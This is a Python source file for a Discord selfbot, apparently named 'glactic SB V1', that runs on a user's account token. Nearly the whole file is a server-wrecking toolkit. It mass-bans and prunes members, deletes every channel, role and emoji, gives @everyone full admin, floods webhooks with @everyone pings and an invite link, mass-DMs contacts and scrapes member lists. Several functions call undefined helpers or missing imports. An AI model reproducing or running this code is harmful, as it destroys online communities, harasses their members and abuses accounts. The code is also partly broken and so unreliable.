import os
os.system('pip uninstall discord')
os.system('pip install discord.py==1.7.3')
os.system('cls')
import discord
from discord.ext import commands
import asyncio
import logging
import random
from colorama import Fore
import requests
import json
import datetime
import threading
import time
import string
import aiohttp
import utils
import random
os.system("cls")


token = input("token:")
prefix = input("prefix:")
headers = {"Authorization": f"{token}"}


client = commands.Bot(command_prefix=prefix, self_bot=True, help_command=None)

with open('config.json') as f:
    config = json.load(f)

tecnochannelencrypt = config.get('channelnames')
tecnorolesencrypt = config.get('rolenames')
tecnoserverencrypt = config.get('servername')
tecnowebspamencrypt = config.get('webhookspammsg')
tecnowebnameencrypt = config.get('webhooknames')
tecnonameencrypt = config.get('name')

tokenrandom = [
    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O",
    "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "_"
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'n',
    'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2',
    '3', '4', '5', '6', '7', '8', '9'
]



@client.event
async def on_connect():
    print(f"""Attempting to kill Discord.
Logging in Your Account.....
Successfully logged in as {client.user}
Made By Luffy""")
os.system("cls")

print("""
      
      

██████╗  █████╗ ██╗      █████╗ ████████╗██╗ ██████╗    ██╗   ██╗ ██╗
██╔════╝ ██╔══██╗██║     ██╔══██╗╚══██╔══╝██║██╔════╝    ██║   ██║███║
██║  ███╗███████║██║     ███████║   ██║   ██║██║         ██║   ██║╚██║
██║   ██║██╔══██║██║     ██╔══██║   ██║   ██║██║         ╚██╗ ██╔╝ ██║
╚██████╔╝██║  ██║███████╗██║  ██║   ██║   ██║╚██████╗     ╚████╔╝  ██║
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝      ╚═══╝   ╚═╝

   
      
      """)

@client.event
async def on_ready():
    os.system(
        f"mode 85,20 & title [glactic SELF BOT] - Connected: {client.user}")
    print(f'''
          
```
AUTHOR: Luffy
CONNECTED TO: {client.user}
Id: {client.user.id}
GUILDS: {len(client.guilds)} 
PREFIX: {prefix}
``` ''')

@client.command(aliases=["h"])
async def help(ctx):
  await ctx.reply(content="""
__**glactic SB V1**__

`` ~ Help``
``~ Nuke``
``~ Text``
``~ Utility``
``~ Botinfo``
``~ glactic SB V1``
""")

@client.command(aliases=["nuke"])
async def n(ctx):
    await ctx.reply(content=f"""
```
glactic Sb V1 Nuke Commands 

• massban       | Bans everyone in the server
• masskick      | Kick everyone in the server 
• securitynuke  | Nukes Server in a cool way
• nickall       | Updates the nickname of all users
• delemojis     | Delets all emojis of the server
• scrape        | Scrape member list from a server
• rc            | Renames every Channel
• rr            | Renames every role
• webhookspam   | Webhookspam pings
• stopspam      | Stops the ongoing spam
• cp            | Check prune for 1 day
• prune         | 1 day prune server
• spamchannels  | Spam creates text channel
• spamroles     | Spam creates roles
• unban         | Unban all members in server
• delchannels   | Deletes all channels of the server
• delroles      | Deletes all roles of the server
• giveadmin     | Enables admin in everyone
                 
~ Created By glactic codes
```                
                  """)

@client.command()
async def text(ctx):

    await ctx.reply(content="""
```
glactic Sb V1 Text Commands

• massdm          | massdm all users
• spam            | spams the chat
• ghostping       | Deletes the ping instantly
• purge           | Deletes Your messages
• afk             | Turns on or off afk system 
• fm              | Shows the first msg of chat
• block           | Block the user
• join vc         | Stay connected 24/7 in vc
• play            | Changes the status to playing
• watch           | Changes the status to watching
• listen          | Changes the status to listening
• stream          | Changes the status to streaming
• stopstatus      | Stops the current status

~ Created By glactic codes
```                  
                  """)
@client.command()
async def utility(ctx):

    await ctx.reply(content="""
```
glactic V1 Utility Commands

• av            | Shows avatar of user
• banner        | Shows banner of user
• si            | Shows info of the server
• ui            | Shows info of the user
• servername    | changes servername
• getroles      | Send all roles of a server
• copyserver    | Clones the server
• leavegroups   | Leaves all groups
• embed         | Embeds the message
• image         | Embeds the image link
• screenshot    | Sends screenshot of site

~ Created By glactic codes
```                   
                  """)

@client.command()
async def botinfo(ctx):

    await ctx.reply(content="""
```
Luffy Sb V1 Botinfo Information

• Language         | Python
• Developers       | Luffy
• Date of creation | Not completed
                  
~ Created By Luffy
```  
                  """)

@client.command(aliases=[""])
async def purge(ctx, amount: int = None):
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(
                lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass
    else:
        async for message in ctx.message.channel.history(limit=amount).filter(
                lambda m: m.author == client.user).map(lambda m: m):
            try:
                await message.delete()
            except:
                pass


@client.command()
async def massdm(ctx, *, x):
	await ctx.reply("**Luffy SELFBOT MASS DM STARTED**", mention_author=True)
	for channel in client.private_channels:
		try:
			await channel.send(x)
			await ctx.reply(f"**Luffy SELFBOT MASS DM** > {channel}", mention_author=True)
		except:
			continue

@client.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
  await ctx.message.delete()
  for channel in ctx.guild.channels:
    await channel.edit(name=name)
 
@client.command(aliases=["rr"])
async def renameroles(ctx, *, name):
  await ctx.message.delete()      
  for role in ctx.guild.roles:
        await role.edit(name=name)

@client.command(aliases=["streaming"])
async def stream(ctx, *, message):
    await ctx.reply("**Luffy SELFBOT | Changing Status To Streaming**", mention_author=True)
    stream = discord.Streaming(
        name=message,
        url=stream_url,
    )
    await client.change_presence(activity=stream)
    await ctx.reply("**Streaming created!**", mention_author=True)

@client.command(aliases=["playing"])
async def play(ctx, *, message):
    game = discord.Game(
        name=message
    ) 
    await ctx.reply("**Luffy SELFBOT | Changing Status To Playing**", mention_author=True)
    await client.change_presence(activity=game) 
    await ctx.reply("Playing Created!", mention_author=True)
    
@client.command(aliases=["watch"])
async def watching(ctx, *, message):
    await ctx.reply("**Luffy SELFBOT | Changing Status To Watching**", mention_author=True)
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, name=message))
    await ctx.reply("**Watching created!**", mention_author=True)

@client.command(aliases=["listen"])
async def listening(ctx, *, message):
    await ctx.reply("**Luffy SELFBOT | Changing Status To Listening**", mention_author=True)
    await client.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening,
            name=message,
        ))
    await ctx.reply("**Listening created!**", mention_author=True)

@client.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
async def stopactivity(ctx):
    await ctx.reply("**Luffy SELFBOT | Removing Status......**", mention_author=True)
    await client.change_presence(activity=None)
    await ctx.reply("**Status Removed Successfully!**", mention_author=True)

@client.command()
async def nickall(ctx, *, name="Luffy#1616 op"):
  print("Nicking All")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 

@client.command()
async def prune(ctx):
    await ctx.reply("**Luffy SELFBOT | pruning...**")
    time.sleep(2)
    await ctx.guild.prune_members(days=1, compute_prune_count=False, roles=ctx.guild.roles)
    time.sleep(1)
    await ctx.reply("**Luffy SELFBOT | Successfully Pruned.**")

@client.command()
async def joinvc(ctx):
    await ctx.reply("**Luffy SELFBOT | Connecting to VC**", mention_author=True)
    channel = ctx.author.voice.channel
    await channel.connect()
    await ctx.reply("**Luffy SELFBOT | SUCCESSFULLY CONNECTED**", mention_author=True)

@client.command()
async def botmassban(ctx, pref, timetosleep, guild):
    pref = pref
    timetosleep = int(timetosleep)
    guild = guild
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('members.txt')
    except:
        pass

    membercount = 0
    with open('members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.reply('**Luffy SELFBOT | BOT MASS BAN \nBanning......**', mention_author=True)
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
            await ctx.send(f"{pref}ban {member}")
            print(f"Banned{member.strip()}")
            time.sleep(timetosleep) # because some bots have cooldown like dyno on there commands 


    members.close()

@client.command()
async def banner(ctx, user:discord.Member):
    if user == None:
        user = ctx.author
    req = await client.http.request(discord.http.Route("GET", "/users/{uid}", uid=user.id))
    banner_id = req["banner"]
    # If statement because the user may not have a banner
    if banner_id:
        banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}?size=1024"
    await ctx.reply(f"{banner_url}", mention_author=True)

@client.command(aliases=['dc', 'delchannels'])
async def deletechannels(ctx):
    try:
        await ctx.message.delete()
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
        sleep(10)

    def dc(i):
        requests.delete(f"https://discord.com/api/v9/channels/{i}",
                        headers=headers).result()

    for i in range(4):
        for channel in list(ctx.guild.channels):
            threading.Thread(target=dc, args=(channel.id, )).start()
            logging.info(f"Deleted channel {channel}.")

@client.command(aliases=["massunban"])
async def unbanall(ctx):
    guild = ctx.guild
    banlist = await guild.bans()
    await ctx.reply('**Luffy SELFBOT | Unbanning All**'.format(len(banlist)), mention_author=True)
    for users in banlist:
            await ctx.guild.unban(user=users.user)

@client.command()
async def block(ctx, *, user: discord.User):
    await ctx.send("**Get Blocked**")
    await user.block()
    
@client.command()
async def unfriend(ctx, *, user: discord.User):
    await user.remove_friend()
    await ctx.send('**Friend has been removed**')

def wspam(webhook):
    while spammingdawebhookeroos:
        randcolor = random.randint(0, 16777215)
        codezink = requests.get("https://pastebin.com/raw/LEAyt3Wx").text
        idktopost = f'https://discord.gg/dsontop @everyone fucked by Luffy'
        data = {'content':idktopost}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(5, 10)
                time.sleep(delay)

        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@client.command(aliases=['spamwebhook'])
async def wh(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=wspam, args=(webhook.url,)).start()

    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1
    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Luffy WAS HERE')
                threading.Thread(target=wspam, args=(webhook.url,)).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except: 
                print(f"{Fore.BLUE} > DISCORD RATE LIMETED")



@client.command()
async def massban(ctx, guild):
  guild = guild
  await client.wait_until_ready()
  guildOBJ = client.get_guild(int(guild))
  members = await guildOBJ.chunk()
  membors = open("Luffy/Scraped/members.txt")
  
  await ctx.reply("**Luffy SELFB0T | MASS BAN STARTED**")
  try:
      os.remove('Luffy/Scraped/members.txt')
  except:
      pass
  with open("Luffy/Scraped/members.txt", 'a') as (scrapedmembers):
       for member in members:
        scrapedmembers.write(str(member.id) + '\n')
       for momobors in membors:
        while True: 
           r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{momobors}", headers=headers, json={'delete_message_days':'0'})
           if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
           else:
             if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
               print(f"{Fore.LIGHTCYAN_EX}[+] {Fore.RESET} {Fore.GREEN} Banned {momobors}")
               break
             else:
               break


@client.command()
async def markallguildread(ctx):
  await ctx.message.delete()
  for guild in client.guilds:
    await guild.ack()

@client.command()
async def ghostping(ctx):
  await ctx.message.delete()


title = '''`Luffy`'''
linky = "discord.gg/dsontop"
footer = "Screenshot"
stream_url = "https://twitch.tv/#"  

@client.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send(f"`{int(round(client.latency * 1000))}ms!`")

username = "LuFFYZ :P"
picture = "https://media.discordapp.net/attachments/748129078531457034/901085835124936714/wp6308211-1.jpg"

@client.command(name = 'snipe')
async def snipe(ctx):
    channel = ctx.channel
    try: 
        em = discord.Embed(name = "Luffy  SELFBOT", title="Luffy SELFBOT", description =f"**Message: {snipe_message_content[channel.id]}\nDeleted By: {snipe_message_author[channel.id]}**")
        em.set_footer(text = "Created By Luffy")
        await ctx.send(embed = em)
    except: 
        await ctx.send(f"**Nothing To Snipe!**")

@client.command()
async def av(ctx, *, user: discord.Member=None):
    await ctx.message.delete()
    format = 'gif'
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = 'png'
    avatar = user.avatar_url_as(format=(format if format != 'gif' else None))
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as (file):
        await ctx.send(file=(discord.File(file, f"Avatar.{format}"))) 

@client.command(aliases=['spamrole', 'rolefuck',"fuckrole","fuckroles","rolesfuck","nukeroles","rolenuke","spamroles"])
async def rolespam(ctx,amountofthemtomake=None,*,nameofthem=None):
  
    await ctx.message.delete()
    if nameofthem == None:
        nameofthem = f"{tecnorolesencrypt}"

    if amountofthemtomake == None:
        amountofthemtomake = 50
    for i in range(int(amountofthemtomake)):
        threading.Thread(target = rooolless, args = (ctx.guild.id,nameofthem,)).start()


def chanellsssxd(idofguild,nameofchan):
    try:
        headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        req = requests.post(f"https://canary.discord.com/api/v8/guilds/{idofguild}/channels",headers=headers,json={"type":"0","name":nameofchan})
    except:
        pass

@client.command(aliases=['textchannelcreation', 'textchannelnuke',"channelspam","nuketextchannels","channelsspam","spamchannels"])
async def cc(ctx,amountofthemtomake=None,*,nameofthem=None):  
  
    await ctx.message.delete()
    if nameofthem == None:
        nameofthem = f"{tecnochannelencrypt}"
    else:
        nameofthem = nameofthem.replace(" ","-")

    if amountofthemtomake == None:
        amountofthemtomake = 50
    for i in range(int(amountofthemtomake)):
        threading.Thread(target = chanellsssxd, args = (ctx.guild.id,nameofthem,)).start()

@client.command(aliases=["deleteemojis"])
async def delemojis(ctx):    
   
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            continue 

@client.command(aliases=['copyserver', 'clone'])
async def copy(ctx):
    gxdto = await client.create_guild(ctx.guild.name)
    gxdtoid = (f"{gxdto.id}")
    lmaohahaxdguild = (f"{ctx.guild.id}")
    extrem_map = {}
    print("Luffy SELFBOT | CLONNING SERVER...")
    guild_from = client.get_guild(int(lmaohahaxdguild))
    guild_to = client.get_guild(int(gxdtoid))
    await client.guild_edit(guild_to, guild_from)
    await client.roles_delete(guild_to)
    await client.channels_delete(guild_to)
    await client.roles_create(guild_to, guild_from)
    await client.categories_create(guild_to, guild_from)
    await client.channels_create(guild_to, guild_from)
    await client.emojis_delete(guild_to)
    await client.emojis_create(guild_to, guild_from)
    await asyncio.sleep(5)

@client.command()
async def giveadmin(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get((guild.roles), name='@everyone')
        await role.edit(permissions=(discord.Permissions.all()))
        print(Fore.MAGENTA + '**Luffy SELFBOT | SUCESSFULLY GIVEN ADMIN**' + Fore.RESET)
    except:
      print(f"'[ERROR]'")

@client.command(aliases=["roles"])
async def getroles(ctx):
    roles = list(ctx.guild.roles)
    roles.reverse()
    roleStr = ""
    for role in roles:
        if role.name == "@everyone":
            roleStr += "@\u200beveryone"
        else:
            roleStr += role.name + "\n"
    print(roleStr)
    await ctx.send(roleStr)

@client.command(
    name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1,
                                           oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(
        name="First Message", value=f"[Click here to Jump]({first_message.jump_url})")
    embed.set_footer(text="Created by Luffy")
    await ctx.send(embed=embed)

@client.command(aliases=['deleterols', 'deleteallroles',"delroles","roledel","delrols","roldel","roledeletion"])
async def deleteroles(ctx):  
    await ctx.message.delete()
    for rol in ctx.guild.roles:
        threading.Thread(target = deletionofarole, args = (ctx.guild.id,rol.id,)).start()

@client.command()
async def pingweb(ctx, website=None):
    await ctx.send(f"Pinging {website} with 32 bytes of data:")
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            try:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            finally:
                e = None
                del e

        if r == 404:
            await ctx.send(f"Website is down, status = ({r})")
        else:
            await ctx.send(f"Website is operational, status = ({r})")
            await ctx.send('Timed out')


client.run(token, bot=False)
